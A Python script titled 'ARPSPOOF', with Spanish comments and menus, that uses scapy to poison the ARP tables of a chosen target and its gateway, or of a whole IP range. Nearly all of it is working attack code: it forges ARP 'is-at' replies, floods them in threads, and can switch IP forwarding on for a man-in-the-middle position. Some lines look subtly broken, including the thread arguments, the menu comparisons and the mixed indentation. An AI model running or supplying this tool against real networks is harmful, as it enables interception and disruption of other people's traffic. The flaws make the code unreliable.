import os
import threading
import ipaddress
from scapy.all import * 
from multiprocessing import Process

def cambiar_fw(valor):
	f=open("/proc/sys/net/ipv4/ip_forward","w")
	s=str(valor)
	f.write(s)
	f.close()
	

def getMACfromIP(ip):
	#Hacemos ping en segundo plano para poder capturar un paquete icmp del que extraer la direccion MAC asociada a la Ip introducida
	os.system("ping -c 2 " + ip + " &"" > /dev/null 2>&1")
	pcap=sniff(filter="icmp and host " + ip,count=1)
	panalisis=pcap[0]

	if (panalisis[IP].src==ip):
		mac=panalisis[Ether].src
	elif (panalisis[IP].dst==ip):
		mac=panalisis[Ether].dst
	else:
		return 0
	print(ip)
	print(mac)
	return mac

def getmac(interface):

  try:
    mac = open('/sys/class/net/'+interface+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]

def enviarPaquete(paqueteARP):
	enviar=True
	while enviar:
		sendp(paqueteARP*2000,inter=1)


def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
	#Obtenemos las direcciones MAC necesarias
	mac_objetivo=getMACfromIP(IP_OBJETIVO)
	mac_gateway=getMACfromIP(IP_GATEWAY)
	mac_propia=getmac("eth0")
	
	os.system("clear")
	print("Envenenando...")
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	print("Enviando paquetes ARP a " + p1[ARP].pdst + " con MAC " + p1[Ether].dst)
	print("Enviando paquetes ARP a " + p2[ARP].pdst + " con MAC " + p2[Ether].dst)
	
	h1=threading.Thread(target=enviarPaquete, args=(p1))
	h1.start()
	h2=threading.Thread(target=enviarPaquete, args=(p2))
	h2.start()

def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	#Enviamos los paquetes para envenenar las tablas
	
	sendp(p1*1000,inter=1)
	sendp(p2*1000,inter=1)


def arpPoisoningLista(lista,ipGateway):
	for ip in lista:
		os.system("clear")
		arpPoissoningSoloIP(ip,ipGateway)

def buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO):
	p=Ether()/ARP()
	p[Ether].dst=MAC_OBJETIVO
	p[Ether].src=MAC_PROPIA
	p[ARP].op="is-at"
	p[ARP].hwsrc=MAC_PROPIA
	p[ARP].psrc=IP_GATEWAY
	p[ARP].hwdst=MAC_OBJETIVO
	p[ARP].pdst=IP_OBJETIVO
	return p

def ips(start, end):
    	import socket, struct
    	start = struct.unpack('>I', socket.inet_aton(start))[0]
    	end = struct.unpack('>I', socket.inet_aton(end))[0]
	return [socket.inet_ntoa(struct.pack('>I', i)) for i in range(start, end+1)]

#    return ipaddress_list

#MENU
def menuForwarding():
	os.system("clear")
	print("\n")
	print("1)Sin Forwarding")
	print("2)Con Forwarding")
	teclado = input()

	if  (teclado == 1):
		cambiar_fw(0)
		print("Desactivando Forwarding")
	elif (teclado == 2):
		cambiar_fw(1)
		print("Activando Forwarding") 
	else:
		print("Opcion no valida")
		time.sleep(2)
		menuForwarding()

def menu():
	os.system("clear")
	menuForwarding()
	ip_obj=	raw_input("Introduce la IP de objetivo \n")
	ip_gate= raw_input("Introduce la IP del gateway \n")
	arpPoissoningSoloIP(ip_obj,ip_gate)

#No usado
def menuGeneral():
	os.system("clear")
	print(" \n\n ")
	print("..................................ARPSPOOF.................................. \n \n ")
	print("                                                    Pedro Jose Gomez Garrido\n \n \n ")
	print("Elija tipo de ataque: \n ")
	print("1)IP simple")
	print("2)Rango IP")
	teclado = input()
	salir=False

	if  (teclado == 1):
		menu()
		
	elif (teclado == 2):
		ip_inicio=	raw_input("Introduce la IP inicial \n")
		ip_fin= raw_input("Introduce la IP final \n")
		ip_gat= raw_input("Introduce la IP del gateway \n")
		ipl=ips(ip_inicio,ip_fin)
		print(ipl)
		arpPoisoningLista(ipl,ip_gat)
		#listaIP=ipRange(ip_inicio,ip_fin)
	else:
		print("Opcion no valida")
		time.sleep(2)
		menuGeneral()


menuGeneral()
